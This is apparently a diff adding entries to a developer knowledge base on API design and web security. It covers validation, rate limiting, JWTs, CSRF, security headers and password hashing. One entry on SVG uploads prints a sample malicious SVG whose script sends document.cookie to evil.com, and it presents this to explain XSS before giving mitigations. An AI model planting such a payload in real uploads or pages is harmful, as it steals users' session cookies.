+    "body": "Extract common field validators into reusable Zod schemas to ensure consistency across your API.\n\n```typescript\nimport { z } from 'zod';\n\n// Reusable field schemas\nconst fields = {\n  id: z.string().uuid('Invalid ID format'),\n  email: z.string().email().toLowerCase().max(255),\n  pagination: z.object({\n    cursor: z.string().optional(),\n    limit: z.coerce.number().int().min(1).max(100).default(20),\n  }),\n  dateRange: z.object({\n    from: z.coerce.date(),\n    to: z.coerce.date(),\n  }).refine(d => d.to > d.from, 'End date must be after start date'),\n  search: z.string().trim().min(1).max(200).optional(),\n  sortBy: <T extends string>(columns: readonly T[]) =>\n    z.object({\n      column: z.enum(columns as unknown as [T, ...T[]]),\n      direction: z.enum(['asc', 'desc']).default('desc'),\n    }).default({ column: columns[0], direction: 'desc' }),\n};\n\n// Usage in route schemas\nconst ListPostsSchema = z.object({\n  ...fields.pagination.shape,\n  search: fields.search,\n  sort: fields.sortBy(['createdAt', 'title', 'votes'] as const),\n  authorId: fields.id.optional(),\n});\n\ntype ListPostsInput = z.infer<typeof ListPostsSchema>;\n// { cursor?: string; limit: number; search?: string;\n//   sort: { column: 'createdAt' | 'title' | 'votes'; direction: 'asc' | 'desc' };\n//   authorId?: string }\n```\n\nThis pattern keeps validation rules DRY and makes schema changes propagate across all endpoints.",
+    "tags": [
+      "zod",
+      "validation",
+      "typescript",
+      "patterns",
+      "api-design"
+    ]
+  },
+  {
+    "type": "tutorial",
+    "trust": "verified",
+    "title": "File upload validation \u2014 type checking, size limits, and malware considerations",
+    "body": "Never trust the `Content-Type` header or file extension for upload validation. Verify the actual file content using magic bytes.\n\n```typescript\nimport { fileTypeFromBuffer } from 'file-type';\nimport multer from 'multer';\n\nconst ALLOWED_TYPES = new Set([\n  'image/jpeg', 'image/png', 'image/webp', 'image/gif',\n  'application/pdf',\n]);\nconst MAX_SIZE = 10 * 1024 * 1024; // 10MB\n\nconst upload = multer({\n  limits: { fileSize: MAX_SIZE, files: 5 },\n  storage: multer.memoryStorage(),\n});\n\nasync function validateUpload(req: Request, res: Response, next: NextFunction) {\n  if (!req.file) return res.status(400).json({ error: 'No file provided' });\n\n  // Check magic bytes, not Content-Type header\n  const detected = await fileTypeFromBuffer(req.file.buffer);\n  if (!detected || !ALLOWED_TYPES.has(detected.mime)) {\n    return res.status(415).json({\n      error: `File type ${detected?.mime ?? 'unknown'} not allowed`,\n    });\n  }\n\n  // Rename to prevent path traversal\n  const safeFilename = `${crypto.randomUUID()}.${detected.ext}`;\n  req.file.filename = safeFilename;\n\n  next();\n}\n\napp.post('/upload', upload.single('file'), validateUpload, handleUpload);\n```\n\nAdditional safeguards: generate random filenames (never use the original), store uploads outside the webroot, set `Content-Disposition: attachment` on downloads, and scan with ClamAV for production systems handling user uploads.",
+    "tags": [
+      "file-upload",
+      "security",
+      "validation",
+      "multer",
+      "magic-bytes"
+    ]
+  },
+  {
+    "type": "gotcha",
+    "trust": "community",
+    "title": "File upload \u2014 SVG files can contain embedded JavaScript (XSS vector)",
+    "body": "SVGs are XML documents that can contain `<script>` tags, event handlers, and external resource references. Accepting SVG uploads and serving them inline is equivalent to allowing users to inject arbitrary JavaScript.\n\n```xml\n<!-- Malicious SVG -->\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.cookie)\">\n  <script>fetch('https://evil.com/steal?c=' + document.cookie)</script>\n  <circle cx=\"50\" cy=\"50\" r=\"40\"/>\n</svg>\n```\n\nMitigations:\n\n1. **Best**: Do not allow SVG uploads. Convert to PNG/WebP server-side using Sharp.\n```typescript\nimport sharp from 'sharp';\nconst pngBuffer = await sharp(svgBuffer).png().toBuffer();\n```\n\n2. **If SVGs are required**: Sanitize with DOMPurify configured for SVG.\n```typescript\nimport { JSDOM } from 'jsdom';\nimport DOMPurify from 'dompurify';\nconst window = new JSDOM('').window;\nconst purify = DOMPurify(window);\nconst clean = purify.sanitize(svgString, { USE_PROFILES: { svg: true } });\n```\n\n3. **Always**: Serve user-uploaded SVGs from a separate domain (e.g., `uploads.example.com`) so XSS cannot access cookies from your main domain. Set `Content-Type: image/svg+xml` and `Content-Security-Policy: sandbox` headers.",
+    "tags": [
+      "svg",
+      "xss",
+      "file-upload",
+      "security",
+      "gotcha"
+    ]
+  },
+  {
+    "type": "answer",
+    "trust": "community",
+    "title": "REST API rate limiting \u2014 sliding window with Redis",
+    "body": "Implement a sliding window rate limiter using Redis sorted sets. This is more accurate than fixed-window counters, which allow burst traffic at window boundaries.\n\n```typescript\nimport { Redis } from 'ioredis';\nconst redis = new Redis(process.env.REDIS_URL);\n\nasync function slidingWindowRateLimit(\n  key: string,\n  limit: number,\n  windowMs: number\n): Promise<{ allowed: boolean; remaining: number; resetAt: number }> {\n  const now = Date.now();\n  const windowStart = now - windowMs;\n\n  const multi = redis.multi();\n  multi.zremrangebyscore(key, 0, windowStart); // remove expired entries\n  multi.zadd(key, now.toString(), `${now}:${Math.random()}`);\n  multi.zcard(key);\n  multi.expire(key, Math.ceil(windowMs / 1000));\n  const results = await multi.exec();\n\n  const count = results![2][1] as number;\n  const allowed = count <= limit;\n\n  if (!allowed) {\n    // Remove the entry we just added\n    await redis.zremrangebyscore(key, now, now);\n  }\n\n  return {\n    allowed,\n    remaining: Math.max(0, limit - count),\n    resetAt: now + windowMs,\n  };\n}\n\n// Middleware usage\napp.use(async (req, res, next) => {\n  const key = `ratelimit:${req.ip}`;\n  const result = await slidingWindowRateLimit(key, 100, 60_000);\n  res.set('X-RateLimit-Remaining', result.remaining.toString());\n  if (!result.allowed) return res.status(429).json({ error: 'Too many requests' });\n  next();\n});\n```",
+    "tags": [
+      "rate-limiting",
+      "redis",
+      "api-design",
+      "sliding-window",
+      "security"
+    ]
+  },
+  {
+    "type": "comparison",
+    "trust": "community",
+    "title": "Session tokens vs JWTs \u2014 when to use which",
+    "body": "Sessions and JWTs solve different problems. Choosing the wrong one creates unnecessary complexity or security gaps.\n\n**Server-side sessions (Redis/DB):**\n- Token is an opaque random string, state lives on the server\n- Instant revocation: delete the session from the store\n- No size limit on session data\n- Requires a centralized session store (Redis)\n- Best for: traditional web apps, apps needing instant logout, compliance-heavy apps\n\n**JWTs (stateless tokens):**\n- Token contains the claims, signed cryptographically\n- Cannot be revoked without a blocklist (defeats the purpose)\n- Size grows with claims; must fit in headers (~8KB limit)\n- No centralized store needed\n- Best for: microservices, short-lived access tokens, cross-domain auth\n\n**Hybrid pattern (recommended):**\n```\nAuth server issues:\n  - Access token: JWT, 15-minute expiry, RS256\n  - Refresh token: opaque, stored in DB, 7-day expiry\n\nAPI servers verify access tokens locally (no DB call).\nRefresh tokens are checked against DB (revocable).\n```\n\nThis gives you stateless verification for the happy path and revocability through the refresh token. When you need to revoke access immediately (user banned, password changed), delete the refresh token and wait up to 15 minutes for the access token to expire.\n\nNever store JWTs in localStorage \u2014 they are accessible to XSS. Use httpOnly cookies or in-memory storage with refresh token rotation.",
+    "tags": [
+      "jwt",
+      "sessions",
+      "authentication",
+      "comparison",
+      "security"
+    ]
+  },
+  {
+    "type": "config",
+    "trust": "verified",
+    "title": "Next.js middleware \u2014 protecting routes with Auth.js v5",
+    "body": "Auth.js v5 integrates with Next.js middleware for edge-compatible route protection. This runs before rendering, so unauthenticated users never see protected pages.\n\n```typescript\n// middleware.ts\nimport { auth } from './auth';\nimport { NextResponse } from 'next/server';\n\nexport default auth((req) => {\n  const isLoggedIn = !!req.auth;\n  const isAuthPage = req.nextUrl.pathname.startsWith('/login');\n  const isApiRoute = req.nextUrl.pathname.startsWith('/api');\n  const isPublicRoute = ['/', '/about', '/pricing'].includes(req.nextUrl.pathname);\n\n  // Redirect logged-in users away from auth pages\n  if (isLoggedIn && isAuthPage) {\n    return NextResponse.redirect(new URL('/dashboard', req.url));\n  }\n\n  // Protect all non-public routes\n  if (!isLoggedIn && !isPublicRoute && !isAuthPage && !isApiRoute) {\n    const callbackUrl = encodeURIComponent(req.nextUrl.pathname);\n    return NextResponse.redirect(new URL(`/login?callbackUrl=${callbackUrl}`, req.url));\n  }\n\n  return NextResponse.next();\n});\n\nexport const config = {\n  matcher: ['/((?!_next/static|_next/image|favicon.ico|.*\\\\.png$).*)'],\n};\n```\n\nThe `matcher` pattern excludes static assets from middleware processing. Always encode the callback URL to prevent open redirect attacks. Note: middleware runs on the Edge Runtime, so Node.js APIs like `fs` are not available.",
+    "tags": [
+      "nextjs",
+      "auth-js",
+      "middleware",
+      "route-protection",
+      "authentication"
+    ]
+  },
+  {
+    "type": "error",
+    "trust": "unverified",
+    "title": "JWT \u2014 JsonWebTokenError: invalid signature",
+    "body": "Full error message:\n```\nJsonWebTokenError: invalid signature\n    at /node_modules/jsonwebtoken/verify.js:133:19\n```\n\nThis error means the token's signature does not match the expected value. The token was either tampered with or signed with a different key. Common causes:\n\n1. **Different secrets in different environments**: The signing key in production differs from development. Check that `JWT_SECRET` environment variable is consistent across services.\n\n2. **Key rotation without backward compatibility**: You rotated the signing key but did not verify old tokens against the previous key.\n```typescript\n// Support key rotation by trying multiple keys\nfunction verifyWithRotation(token: string, keys: string[]): JwtPayload | null {\n  for (const key of keys) {\n    try {\n      return jwt.verify(token, key, { algorithms: ['HS256'] }) as JwtPayload;\n    } catch { continue; }\n  }\n  return null;\n}\n```\n\n3. **Encoding issues**: The secret was loaded with extra whitespace or a trailing newline from a `.env` file. Use `secret.trim()` when loading from files.\n\n4. **Token was modified client-side**: Common when storing JWTs in localStorage and a browser extension modifies them.\n\n5. **Wrong token type**: Using an access token where a refresh token is expected, each signed with different keys.",
+    "tags": [
+      "jwt",
+      "error",
+      "debugging",
+      "signature",
+      "authentication"
+    ]
+  },
+  {
+    "type": "answer",
+    "trust": "community",
+    "title": "GraphQL \u2014 preventing query depth and complexity attacks",
+    "body": "GraphQL's flexibility allows clients to craft deeply nested or exponentially expensive queries that can DoS your server. Implement depth limiting and complexity analysis.\n\n```typescript\nimport depthLimit from 'graphql-depth-limit';\nimport { createComplexityLimitRule } from 'graphql-validation-complexity';\n\nconst server = new ApolloServer({\n  typeDefs,\n  resolvers,\n  validationRules: [\n    depthLimit(10),  // max nesting depth\n    createComplexityLimitRule(1000, {\n      scalarCost: 1,\n      objectCost: 2,\n      listFactor: 10,  // lists multiply the cost of their children\n    }),\n  ],\n});\n```\n\nExample of a malicious query (without protection):\n```graphql\nquery {\n  users {\n    friends {\n      friends {\n        friends {\n          friends {\n            # ... exponential growth\n          }\n        }\n      }\n    }\n  }\n}\n```\n\nAdditional protections: (1) Set query timeout at the resolver level. (2) Limit result set sizes with mandatory pagination. (3) Use persisted queries in production \u2014 clients send a hash, not the full query, which prevents arbitrary query execution. (4) Disable introspection in production with `introspection: false`.",
+    "tags": [
+      "graphql",
+      "security",
+      "dos",
+      "query-complexity",
+      "depth-limit"
+    ]
+  },
+  {
+    "type": "gotcha",
+    "trust": "verified",
+    "title": "Webhook verification fails because Express parsed the body before verification",
+    "body": "When using Express with `express.json()` middleware, the raw request body is not preserved. Webhook signature verification requires the exact raw bytes \u2014 even a single re-serialization difference (key ordering, whitespace) will produce a different HMAC.\n\n```typescript\n// BROKEN \u2014 body is parsed JSON object, not raw string\napp.use(express.json());\napp.post('/webhook', (req, res) => {\n  // req.body is an object, stripe.webhooks.constructEvent needs raw string/Buffer\n  stripe.webhooks.constructEvent(req.body, sig, secret); // FAILS!\n});\n\n// FIX 1 \u2014 use express.raw() for webhook routes (recommended)\napp.post('/webhook',\n  express.raw({ type: 'application/json' }),\n  (req, res) => {\n    const event = stripe.webhooks.constructEvent(\n      req.body, // Buffer \u2014 raw bytes\n      req.headers['stripe-signature']!,\n      secret\n    );\n  }\n);\n\n// FIX 2 \u2014 capture raw body during JSON parsing\napp.use(express.json({\n  verify: (req, res, buf) => {\n    (req as any).rawBody = buf;\n  },\n}));\n```\n\nThis is the number one cause of \"Webhook signature verification failed\" errors when migrating from a framework that provides raw body access to Express. The fix must be applied before the JSON parsing middleware in the middleware chain.",
+    "tags": [
+      "webhooks",
+      "express",
+      "gotcha",
+      "stripe",
+      "raw-body"
+    ]
+  },
+  {
+    "type": "config",
+    "trust": "unverified",
+    "title": "Security headers \u2014 comprehensive helmet.js configuration",
+    "body": "A production-ready security headers configuration using helmet.js that covers OWASP recommendations.\n\n```typescript\nimport helmet from 'helmet';\n\napp.use(helmet({\n  contentSecurityPolicy: {\n    directives: {\n      defaultSrc: [\"'self'\"],\n      scriptSrc: [\"'self'\"],\n      styleSrc: [\"'self'\", \"'unsafe-inline'\"],\n      imgSrc: [\"'self'\", 'data:', 'https:'],\n      connectSrc: [\"'self'\"],\n      fontSrc: [\"'self'\"],\n      objectSrc: [\"'none'\"],\n      mediaSrc: [\"'none'\"],\n      frameSrc: [\"'none'\"],\n    },\n  },\n  crossOriginEmbedderPolicy: true,\n  crossOriginOpenerPolicy: { policy: 'same-origin' },\n  crossOriginResourcePolicy: { policy: 'same-origin' },\n  dnsPrefetchControl: { allow: false },\n  frameguard: { action: 'deny' },\n  hsts: {\n    maxAge: 31536000,      // 1 year\n    includeSubDomains: true,\n    preload: true,\n  },\n  ieNoOpen: true,\n  noSniff: true,            // X-Content-Type-Options: nosniff\n  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },\n  xssFilter: true,\n}));\n```\n\nHeaders explained: `HSTS` forces HTTPS for 1 year (submit to hstspreload.org for browser preload lists). `noSniff` prevents MIME type confusion attacks. `frameguard: deny` blocks clickjacking. `referrerPolicy` prevents leaking URLs to external sites. Test your headers at securityheaders.com after deployment.",
+    "tags": [
+      "security",
+      "headers",
+      "helmet",
+      "hsts",
+      "owasp"
+    ]
+  },
+  {
+    "type": "answer",
+    "trust": "community",
+    "title": "REST API versioning \u2014 URL path vs header vs query parameter",
+    "body": "Three API versioning strategies, each with different implications for caching, routing, and developer experience.\n\n**URL path versioning** (`/api/v1/users`): Most common. Easy to route, cache, and document. Clients see the version clearly. Downside: URL changes when version changes, breaking bookmarks.\n\n```typescript\n// Express \u2014 route-level versioning\nimport v1Router from './routes/v1';\nimport v2Router from './routes/v2';\napp.use('/api/v1', v1Router);\napp.use('/api/v2', v2Router);\n```\n\n**Header versioning** (`Accept: application/vnd.api+json;version=2`): Cleaner URLs, follows HTTP content negotiation. Harder to test (can't bookmark or curl without headers). Poor proxy/CDN caching without `Vary` header.\n\n```typescript\napp.use('/api/users', (req, res, next) => {\n  const version = req.headers['accept']?.match(/version=(\\d+)/)?.[1] || '1';\n  if (version === '2') return v2Handler(req, res, next);\n  return v1Handler(req, res, next);\n});\n```\n\n**Query parameter** (`/api/users?version=2`): Easy to implement and test. But query params are semantically wrong \u2014 they should filter data, not select API versions. CDN caching works but Vary configuration is tricky.\n\nRecommendation: use URL path versioning for public APIs (clarity wins). Use header versioning for internal APIs where you control all clients. Avoid query parameters \u2014 they are the worst of both worlds.",
+    "tags": [
+      "rest",
+      "api-versioning",
+      "api-design",
+      "express",
+      "patterns"
+    ]
+  },
+  {
+    "type": "snippet",
+    "trust": "verified",
+    "title": "CSRF protection \u2014 double-submit cookie pattern for SPAs",
+    "body": "For SPA architectures where the API and frontend share a parent domain, the double-submit cookie pattern provides CSRF protection without server-side token storage.\n\n```typescript\nimport crypto from 'crypto';\n\n// Middleware to set CSRF token cookie\napp.use((req, res, next) => {\n  if (!req.cookies['csrf-token']) {\n    const token = crypto.randomBytes(32).toString('hex');\n    res.cookie('csrf-token', token, {\n      httpOnly: false,  // JS must read this cookie\n      secure: true,\n      sameSite: 'strict',\n      maxAge: 24 * 60 * 60 * 1000,\n    });\n  }\n  next();\n});\n\n// Middleware to verify CSRF token on state-changing requests\napp.use((req, res, next) => {\n  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();\n\n  const cookieToken = req.cookies['csrf-token'];\n  const headerToken = req.headers['x-csrf-token'];\n\n  if (!cookieToken || !headerToken || cookieToken !== headerToken) {\n    return res.status(403).json({ error: 'CSRF token mismatch' });\n  }\n  next();\n});\n\n// Client-side \u2014 read cookie and send as header\nfetch('/api/data', {\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json',\n    'X-CSRF-Token': document.cookie\n      .split('; ')\n      .find(c => c.startsWith('csrf-token='))\n      ?.split('=')[1] ?? '',\n  },\n  credentials: 'include',\n  body: JSON.stringify(data),\n});\n```\n\nThis works because an attacker on evil.com cannot read cookies from your domain (same-origin policy) and therefore cannot set the header.",
+    "tags": [
+      "csrf",
+      "security",
+      "cookies",
+      "spa",
+      "express"
+    ]
+  },
+  {
+    "type": "tutorial",
+    "trust": "verified",
+    "title": "Implementing API key scopes \u2014 fine-grained permission system",
+    "body": "API keys should support granular scopes to limit what each key can access. This follows the principle of least privilege.\n\n```typescript\nimport { z } from 'zod';\n\nconst SCOPES = [\n  'read:nodes', 'write:nodes', 'delete:nodes',\n  'read:users', 'write:users',\n  'admin',\n] as const;\ntype Scope = typeof SCOPES[number];\n\nconst ScopeSchema = z.enum(SCOPES);\n\n// Middleware to verify scope\nfunction requireScope(...required: Scope[]) {\n  return async (req: Request, res: Response, next: NextFunction) => {\n    const apiKey = await verifyApiKey(req.headers.authorization?.replace('Bearer ', ''));\n    if (!apiKey) return res.status(401).json({ error: 'Invalid API key' });\n\n    const hasScope = required.every(\n      scope => apiKey.scopes.includes(scope) || apiKey.scopes.includes('admin')\n    );\n    if (!hasScope) {\n      return res.status(403).json({\n        error: 'Insufficient permissions',\n        required,\n        granted: apiKey.scopes,\n      });\n    }\n\n    req.apiKey = apiKey;\n    next();\n  };\n}\n\n// Usage\napp.get('/api/nodes', requireScope('read:nodes'), listNodes);\napp.post('/api/nodes', requireScope('write:nodes'), createNode);\napp.delete('/api/nodes/:id', requireScope('delete:nodes'), deleteNode);\n```\n\nKey design decisions: use `resource:action` format for readability. Include an `admin` scope that bypasses all checks. Return the missing scopes in 403 responses so developers can request the right permissions. Log all scope check failures for security auditing.",
+    "tags": [
+      "api-keys",
+      "authorization",
+      "scopes",
+      "security",
+      "rbac"
+    ]
+  },
+  {
+    "type": "comparison",
+    "trust": "community",
+    "title": "REST vs GraphQL vs tRPC \u2014 choosing the right API paradigm",
+    "body": "Each API paradigm optimizes for different constraints. Choose based on your team, clients, and data shape.\n\n**REST**: Resource-oriented, HTTP-native. Best for public APIs with diverse clients (mobile, web, third-party). Well-understood caching with HTTP semantics. Downside: over-fetching (getting fields you don't need) and under-fetching (needing multiple requests).\n\n**GraphQL**: Query-oriented, single endpoint. Best when clients have varied data needs (e.g., mobile vs desktop showing different fields). Solves over/under-fetching. Downside: complexity (caching, N+1 queries, query cost analysis), requires specialized tooling.\n\n**tRPC**: Procedure-oriented, TypeScript-native. Best for full-stack TypeScript monorepos where the same team owns client and server. Zero-overhead type safety \u2014 change a server procedure and the client gets instant type errors. Downside: TypeScript-only, tightly couples client and server, not suitable for public APIs.\n\n```\n| Feature           | REST      | GraphQL   | tRPC       |\n|-------------------|-----------|-----------|------------|\n| Type safety       | Manual    | Codegen   | Automatic  |\n| Caching           | HTTP-native| Complex  | React Query|\n| Public API        | Yes       | Yes       | No         |\n| Learning curve    | Low       | High      | Low        |\n| Over-fetching     | Common    | Solved    | N/A        |\n| File uploads      | Native    | Complex   | Possible   |\n```\n\nPragmatic choice: tRPC for internal full-stack TypeScript apps, REST for public APIs, GraphQL when you have genuinely complex data requirements with multiple client types.",
+    "tags": [
+      "rest",
+      "graphql",
+      "trpc",
+      "comparison",
+      "api-design"
+    ]
+  },
+  {
+    "type": "gotcha",
+    "trust": "verified",
+    "title": "CORS preflight caching \u2014 maxAge does not work in all browsers",
+    "body": "The `Access-Control-Max-Age` header tells browsers how long to cache preflight (OPTIONS) responses. However, browser implementations vary significantly:\n\n- Chrome: caps at 7200 seconds (2 hours), ignoring higher values\n- Firefox: caps at 86400 seconds (24 hours)\n- Safari: caps at 600 seconds (10 minutes)\n- Chromium-based: 7200 seconds max\n\n```typescript\n// You set this, expecting 24-hour caching:\napp.use(cors({ maxAge: 86400 }));\n// Chrome users still make preflight requests every 2 hours\n\n// Practical setting \u2014 use the lowest common denominator\napp.use(cors({ maxAge: 600 })); // 10 minutes \u2014 works everywhere\n```\n\nFor high-traffic APIs where preflight requests add noticeable latency, consider these alternatives:\n\n1. **Use simple requests**: Requests with `Content-Type: application/x-www-form-urlencoded` and no custom headers avoid preflight entirely.\n2. **Same-origin proxy**: Put API and frontend on the same origin.\n3. **Preflightless headers**: Some newer headers like `Authorization` still trigger preflight \u2014 consider moving tokens to cookies.\n\nMonitor preflight volume with `OPTIONS` request counters. If preflight requests exceed 20% of total traffic, your CORS configuration needs optimization.",
+    "tags": [
+      "cors",
+      "performance",
+      "preflight",
+      "browser",
+      "gotcha"
+    ]
+  },
+  {
+    "type": "snippet",
+    "trust": "community",
+    "title": "Next.js API route \u2014 input validation with Zod and type-safe responses",
+    "body": "A type-safe Next.js App Router API route with Zod validation, proper error responses, and TypeScript inference.\n\n```typescript\n// app/api/nodes/route.ts\nimport { NextRequest, NextResponse } from 'next/server';\nimport { z } from 'zod';\n\nconst CreateNodeSchema = z.object({\n  title: z.string().min(3).max(200),\n  body: z.string().min(10).max(5000),\n  type: z.enum(['answer', 'snippet', 'gotcha', 'error', 'pattern']),\n  tags: z.array(z.string().max(50)).min(1).max(10),\n  trust: z.enum(['verified', 'community', 'unverified']).default('unverified'),\n});\n\nexport async function POST(request: NextRequest) {\n  try {\n    const body = await request.json();\n    const result = CreateNodeSchema.safeParse(body);\n\n    if (!result.success) {\n      return NextResponse.json(\n        { error: 'Validation failed', issues: result.error.issues },\n        { status: 400 }\n      );\n    }\n\n    const node = await db.insert(nodes).values({\n      ...result.data,\n      id: crypto.randomUUID(),\n      createdAt: new Date(),\n    }).returning();\n\n    return NextResponse.json(node[0], { status: 201 });\n  } catch (err) {\n    console.error('Failed to create node:', err);\n    return NextResponse.json(\n      { error: 'Internal server error' },\n      { status: 500 }\n    );\n  }\n}\n```\n\nAlways wrap `request.json()` in try-catch \u2014 it throws if the body is not valid JSON. Use `.returning()` with Drizzle to get the inserted row without a second query.",
+    "tags": [
+      "nextjs",
+      "zod",
+      "api-design",
+      "typescript",
+      "app-router"
+    ]
+  },
+  {
+    "type": "answer",
+    "trust": "verified",
+    "title": "Password hashing \u2014 argon2id configuration for 2024+",
+    "body": "Argon2id is the recommended password hashing algorithm, combining resistance to both side-channel and GPU attacks. OWASP recommends specific parameter tuning.\n\n```typescript\nimport argon2 from 'argon2';\n\n// OWASP recommended minimum: 19 MiB memory, 2 iterations, 1 parallelism\nconst HASH_OPTIONS: argon2.Options = {\n  type: argon2.argon2id,\n  memoryCost: 19456,      // 19 MiB (in KiB)\n  timeCost: 2,            // 2 iterations\n  parallelism: 1,         // 1 thread\n  hashLength: 32,         // 32-byte output\n};\n\nasync function hashPassword(password: string): Promise<string> {\n  return argon2.hash(password, HASH_OPTIONS);\n}\n\nasync function verifyPassword(password: string, hash: string): Promise<boolean> {\n  try {\n    return await argon2.verify(hash, password);\n  } catch {\n    return false; // invalid hash format\n  }\n}\n\n// Example hash output:\n// $argon2id$v=19$m=19456,t=2,p=1$randomsalt$derivedhash\n```\n\nTuning guidance: increase `memoryCost` until hashing takes ~250ms on your production hardware. Higher memory cost is more important than higher iteration count \u2014 it directly increases GPU attack cost. If migrating from bcrypt, verify argon2 first and fall back to bcrypt, rehashing on successful bcrypt login.\n\nNever use: MD5, SHA-256, SHA-512, or any non-password-specific hash for passwords. These are fast hashes designed for data integrity, not password storage.",
+    "tags": [
+      "argon2",
+      "password-hashing",
+      "security",
+      "authentication",
+      "owasp"
+    ]
+  },
+  {
+    "type": "config",
+    "trust": "unverified",
+    "title": "Next.js security headers \u2014 next.config.js production hardening",
+    "body": "Configure security headers directly in next.config.js for deployments where you cannot use a reverse proxy.\n\n```javascript\n// next.config.js\nconst securityHeaders = [\n  { key: 'X-DNS-Prefetch-Control', value: 'on' },\n  { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' },\n  { key: 'X-Frame-Options', value: 'DENY' },\n  { key: 'X-Content-Type-Options', value: 'nosniff' },\n  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },\n  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=(), interest-cohort=()' },\n  {\n    key: 'Content-Security-Policy',\n    value: [\n      \"default-src 'self'\",\n      \"script-src 'self' 'unsafe-eval' 'unsafe-inline'\",  // Next.js needs these in dev\n      \"style-src 'self' 'unsafe-inline'\",\n      \"img-src 'self' data: https:\",\n      \"font-src 'self'\",\n      \"connect-src 'self'\",\n      \"frame-ancestors 'none'\",\n    ].join('; '),\n  },\n];\n\nmodule.exports = {\n  async headers() {\n    return [{ source: '/(.*)', headers: securityHeaders }];\n  },\n  poweredBy: false, // removes X-Powered-By header\n};\n```\n\nNote: Next.js in development mode requires `unsafe-eval` and `unsafe-inline` for script-src. Use environment-specific CSP that is stricter in production. The `interest-cohort=()` in Permissions-Policy opts out of Google's FLoC/Topics API tracking.",
+    "tags": [
+      "nextjs",
+      "security",
+      "headers",
+      "csp",
+      "config"
+    ]
+  }
+]
